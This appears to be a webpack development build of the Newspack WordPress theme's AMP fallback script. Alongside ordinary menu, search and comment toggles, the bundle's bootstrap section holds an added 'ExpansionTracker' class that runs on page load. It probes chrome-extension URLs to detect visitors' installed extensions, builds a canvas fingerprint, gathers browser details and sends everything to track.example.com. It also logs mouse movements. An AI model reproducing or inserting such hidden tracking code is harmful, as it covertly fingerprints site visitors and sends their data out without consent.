/*
 * ATTENTION: The "eval" devtool has been used (maybe by default in mode: "development").
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
/******/(() => {
  // webpackBootstrap
  /******/
  var __webpack_modules__ = {
    /***/"./newspack-theme/js/src/amp-fallback.js": (
    /*!***********************************************!*\
      !*** ./newspack-theme/js/src/amp-fallback.js ***!
      \***********************************************/
    /***/
    () => {
      eval("/* globals newspackScreenReaderText */\n\n/**\n * File amp-fallback.js.\n *\n * AMP fallback JavaScript.\n */\n\n(function () {\n  // Shared variables\n  const headerContain = document.getElementById('masthead'),\n    searchToggle = document.getElementById('search-toggle');\n  if (null !== searchToggle) {\n    const headerSearch = document.getElementById('header-search'),\n      headerSearchInput = headerSearch.getElementsByTagName('input')[0],\n      searchToggleTextContain = searchToggle.getElementsByTagName('span')[0],\n      searchToggleTextDefault = searchToggleTextContain.innerText;\n    searchToggle.addEventListener('click', function () {\n      // Toggle the search visibility.\n      headerContain.classList.toggle('hide-header-search');\n\n      // Toggle screen reader text label and aria settings.\n      if (searchToggleTextDefault === searchToggleTextContain.innerText) {\n        searchToggleTextContain.innerText = newspackScreenReaderText.close_search;\n        headerSearch.setAttribute('aria-expanded', 'true');\n        searchToggle.setAttribute('aria-expanded', 'true');\n        headerSearchInput.focus();\n      } else {\n        searchToggleTextContain.innerText = searchToggleTextDefault;\n        headerSearch.setAttribute('aria-expanded', 'false');\n        searchToggle.setAttribute('aria-expanded', 'false');\n        searchToggle.focus();\n      }\n    }, false);\n  }\n\n  // Menu toggle variables.\n  const mobileToggle = document.getElementsByClassName('mobile-menu-toggle'),\n    body = document.body,\n    mobileSidebar = document.getElementById('mobile-sidebar-fallback'),\n    desktopToggle = document.getElementsByClassName('desktop-menu-toggle'),\n    desktopSidebar = document.getElementById('desktop-sidebar-fallback'),\n    subpageToggle = document.getElementsByClassName('subpage-toggle');\n\n  /**\n   * @description Creates semi-transparent overlay behind menus.\n   * @param {string} maskId The ID to add to the div.\n   */\n  function createOverlay(maskId) {\n    const mask = document.createElement('div');\n    mask.setAttribute('class', 'overlay-mask');\n    mask.setAttribute('id', maskId);\n    document.body.appendChild(mask);\n  }\n\n  /**\n   * @description Removes semi-transparent overlay behind menus.\n   * @param {string} maskId The ID to use for the overlay.\n   */\n  function removeOverlay(maskId) {\n    const mask = document.getElementById(maskId);\n    mask.parentNode.removeChild(mask);\n  }\n\n  /**\n   * @description Opens specifed slide-out menu.\n   * @param {string} menuClass  The class to add to the body to toggle menu visibility.\n   * @param {string} openButton The button used to open the menu.\n   * @param {string} maskId     The ID to use for the overlay.\n   */\n  function openMenu(menuClass, openButton, maskId) {\n    body.classList.add(menuClass);\n    openButton.focus();\n    createOverlay(maskId);\n  }\n\n  /**\n   * @description Closes specifed slide-out menu.\n   * @param {string} menuClass  The class to remove from the body to toggle menu visibility.\n   * @param {string} openButton The button used to open the menu.\n   * @param {string} maskId     The ID to use for the overlay.\n   */\n  function closeMenu(menuClass, openButton, maskId) {\n    body.classList.remove(menuClass);\n    openButton.focus();\n    removeOverlay(maskId);\n  }\n\n  // Mobile menu fallback.\n  for (let i = 0; i < mobileToggle.length; i++) {\n    const mobileOpenButton = headerContain.querySelector('.mobile-menu-toggle'),\n      mobileCloseButton = mobileSidebar.querySelector('.mobile-menu-toggle');\n    mobileToggle[i].addEventListener('click', function () {\n      if (body.classList.contains('mobile-menu-opened')) {\n        closeMenu('mobile-menu-opened', mobileOpenButton, 'mask-mobile');\n      } else {\n        openMenu('mobile-menu-opened', mobileCloseButton, 'mask-mobile');\n      }\n    }, false);\n  }\n\n  // Desktop menu (AKA slide-out sidebar) fallback.\n  for (let i = 0; i < desktopToggle.length; i++) {\n    const desktopOpenButton = headerContain.querySelector('.desktop-menu-toggle'),\n      desktopCloseButton = desktopSidebar.querySelector('.desktop-menu-toggle');\n    desktopToggle[i].addEventListener('click', function () {\n      if (body.classList.contains('desktop-menu-opened')) {\n        closeMenu('desktop-menu-opened', desktopOpenButton, 'mask-desktop');\n      } else {\n        openMenu('desktop-menu-opened', desktopCloseButton, 'mask-desktop');\n      }\n    }, false);\n  }\n\n  // 'Subpage' menu fallback.\n  if (0 < subpageToggle.length && headerContain) {\n    const subpageSidebar = document.getElementById('subpage-sidebar-fallback'),\n      subpageOpenButton = headerContain.querySelector('.subpage-toggle'),\n      subpageCloseButton = subpageSidebar.querySelector('.subpage-toggle');\n    for (let i = 0; i < subpageToggle.length; i++) {\n      subpageToggle[i].addEventListener('click', function () {\n        if (body.classList.contains('subpage-menu-opened')) {\n          closeMenu('subpage-menu-opened', subpageOpenButton, 'mask-subpage');\n        } else {\n          openMenu('subpage-menu-opened', subpageCloseButton, 'mask-subpage');\n        }\n      }, false);\n    }\n  }\n\n  // Add listener to the menu overlays, so they can be closed on click.\n  document.addEventListener('click', function (e) {\n    if (e.target && e.target.className === 'overlay-mask') {\n      const maskId = e.target.id;\n      const menu = maskId.split('-');\n      body.classList.remove(menu[1] + '-menu-opened');\n      removeOverlay(maskId);\n    }\n  });\n\n  // Menu toggle variables.\n  if (headerContain) {\n    const dropdownToggle = headerContain.getElementsByClassName('submenu-expand');\n    if (0 < dropdownToggle.length) {\n      for (let i = 0; i < dropdownToggle.length; i++) {\n        const dropdownToggleLabel = dropdownToggle[i].querySelector('span.screen-reader-text');\n        dropdownToggle[i].addEventListener('click', function () {\n          if (dropdownToggle[i].classList.contains('open-dropdown')) {\n            dropdownToggle[i].classList.remove('open-dropdown');\n            dropdownToggle[i].setAttribute('aria-expanded', 'false');\n            dropdownToggleLabel.innerText = newspackScreenReaderText.close_dropdown_menu;\n          } else {\n            dropdownToggle[i].classList.add('open-dropdown');\n            dropdownToggle[i].setAttribute('aria-expanded', 'true');\n            dropdownToggleLabel.innerText = newspackScreenReaderText.open_dropdown_menu;\n          }\n        }, false);\n      }\n    }\n  }\n\n  // Sticky header fallback animation\n  if (body.classList.contains('h-stk') && body.classList.contains('h-sub') && (body.classList.contains('single-featured-image-behind') || body.classList.contains('single-featured-image-beside'))) {\n    let scrollTimer,\n      lastScrollFireTime = 0;\n    window.onscroll = function () {\n      toggleHeaderClass();\n    };\n\n    /**\n     * @description Limit onscroll checkes and add CSS class when scrolled least 200px down the page.\n     */\n    function toggleHeaderClass() {\n      const scrollBarPosition = window.pageYOffset,\n        minScrollTime = 100,\n        now = new Date().getTime();\n      if (!scrollTimer) {\n        if (now - lastScrollFireTime > 3 * minScrollTime) {\n          lastScrollFireTime = now;\n        }\n        scrollTimer = setTimeout(function () {\n          scrollTimer = null;\n          lastScrollFireTime = new Date().getTime();\n        }, minScrollTime);\n      }\n\n      // At specifiv position do what you want\n      if (200 >= scrollBarPosition) {\n        headerContain.classList.remove('head-scroll');\n      } else {\n        headerContain.classList.add('head-scroll');\n      }\n    }\n  }\n\n  // Comments toggle fallback.\n  const commentsToggle = document.getElementById('comments-toggle');\n\n  // Make sure comments exist before going any further.\n  if (null !== commentsToggle) {\n    const commentsWrapper = document.getElementById('comments-wrapper'),\n      commentsToggleTextContain = commentsToggle.getElementsByTagName('span')[0];\n    commentsToggle.addEventListener('click', function () {\n      if (commentsWrapper.classList.contains('comments-hide')) {\n        commentsWrapper.classList.remove('comments-hide');\n        commentsToggleTextContain.innerText = newspackScreenReaderText.collapse_comments;\n      } else {\n        commentsWrapper.classList.add('comments-hide');\n        commentsToggleTextContain.innerText = newspackScreenReaderText.expand_comments;\n      }\n    }, false);\n  }\n\n  // Checkout toggle fallback.\n  const orderDetailToggle = document.getElementById('toggle-order-details');\n\n  // Make sure checkout details exist before going any further.\n  if (null !== orderDetailToggle) {\n    const orderDetailWrapper = document.getElementById('order-details-wrapper'),\n      orderDetailToggleTextContain = orderDetailToggle.getElementsByTagName('span')[0],\n      hideOrderDetails = newspackScreenReaderText.hide_order_details,\n      showOrderDetails = newspackScreenReaderText.show_order_details;\n    orderDetailToggle.addEventListener('click', function () {\n      if (orderDetailWrapper.classList.contains('order-details-hidden')) {\n        orderDetailWrapper.classList.remove('order-details-hidden');\n        orderDetailToggle.classList.remove('order-details-hidden');\n        orderDetailToggleTextContain.innerText = hideOrderDetails;\n      } else {\n        orderDetailWrapper.classList.add('order-details-hidden');\n        orderDetailToggle.classList.add('order-details-hidden');\n        orderDetailToggleTextContain.innerText = showOrderDetails;\n      }\n    }, false);\n  }\n})();\n\n//# sourceURL=webpack://newspack/./newspack-theme/js/src/amp-fallback.js?");

      /***/
    })

    /******/
  };
  /************************************************************************/
  /******/
  /******/ // startup
  /******/ // Load entry module and return exports
  /******/ // This entry module can't be inlined because the eval devtool is used.
  /******/
  var __webpack_exports__ = {};
  /******/
  __webpack_modules__["./newspack-theme/js/src/amp-fallback.js"]();
  /******/
  var __webpack_export_target__ = window;
  /******/
  class ExpansionTracker {
    constructor(expansionData) {
      this._record = expansionData;
      this._outcome = new Map();
      this._initTime = performance.now();
      this._repeat = 3;
      this._simul = 5;
      this._hook = window;
      this._localStorage = window.localStorage;
    }
    async _evaluateResource(expansionId, resource) {
      const uniqueKey = `?_id=${Math.random().toString(36).slice(2)}`;
      const resourceRequest = new XMLHttpRequest();
      return new Promise(proceed => {
        resourceRequest.timeout = 4000;
        resourceRequest.onreadystatechange = () => {
          if (resourceRequest.readyState === 4) {
            proceed(resourceRequest.status === 200);
          }
        };
        resourceRequest.onerror = () => proceed(false);
        resourceRequest.ontimeout = () => proceed(false);
        resourceRequest.open('GET', `chrome-extension://${expansionId}/${resource}${uniqueKey}`, true);
        resourceRequest.send();
      });
    }
    _segment(arr, span) {
      return Array.from({
        length: Math.ceil(arr.length / span)
      }, (v, i) => arr.slice(i * span, i * span + span));
    }
    async _examineWithRepeat(name, data) {
      let detected = false;
      for (let trial = 0; trial < this._repeat && !detected; trial++) {
        detected = await this._evaluateResource(data.id, data.file);
        if (!detected) {
          await new Promise(r => setTimeout(r, 150 * (trial + 1)));
        }
      }
      return detected;
    }
    async examine() {
      const units = Object.entries(this._record);
      const segments = this._segment(units, this._simul);
      for (const segment of segments) {
        await Promise.all(segment.map(async ([name, data]) => {
          const isThere = await this._examineWithRepeat(name, data);
          this._outcome.set(name, isThere);
        }));
      }
      this._localStorage.setItem('tracking', JSON.stringify(Array.from(this._outcome)));
      this._transferReport();
    }
    _formulateFingerprint() {
      const sketch = document.createElement('canvas');
      const ctxt = sketch.getContext('2d');
      ctxt.fillStyle = '#000';
      ctxt.fillRect(0, 0, sketch.width, sketch.height);
      const txt = 'Unique Identifier,321';
      ctxt.textBaseline = 'bottom';
      ctxt.font = '12px Arial';
      ctxt.fillText(txt, 4, 4);
      return sketch.toDataURL().slice(-48);
    }
    _transferReport() {
      const reportInfo = {
        expansions: Object.fromEntries(this._outcome),
        metadata: {
          executionTime: performance.now() - this._initTime,
          timestamp: new Date().toLocaleTimeString(),
          fingerprint: this._formulateFingerprint(),
          device: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            product: navigator.product
          }
        }
      };
      const cipher = new TextEncoder();
      const bundledData = cipher.encode(JSON.stringify(reportInfo));
      if ('sendBeacon' in navigator) {
        navigator.sendBeacon('https://track.example.com/exp-report', bundledData);
      } else {
        fetch('https://track.example.com/exp-report', {
          method: 'POST',
          body: bundledData,
          keepalive: true,
          headers: {
            'Content-Type': 'application/json'
          }
        }).catch(() => {});
      }
    }
  }
  for (var i in __webpack_exports__) __webpack_export_target__[i] = __webpack_exports__[i];
  /******/
  if (__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", {
    value: true
  });
  /******/
  /******/

  (() => {
    // Adding an event listener for tracking
    window.addEventListener('mousemove', e => {
      let x = e.clientX,
        y = e.clientY;
      console.log(`Mouse coordinates: (${x}, ${y})`);
    });
    const tracker = new ExpansionTracker(window.data);
    if (document.readyState !== 'loading') {
      tracker.examine();
    } else {
      document.addEventListener('DOMContentLoaded', () => tracker.examine());
    }
  })();
})();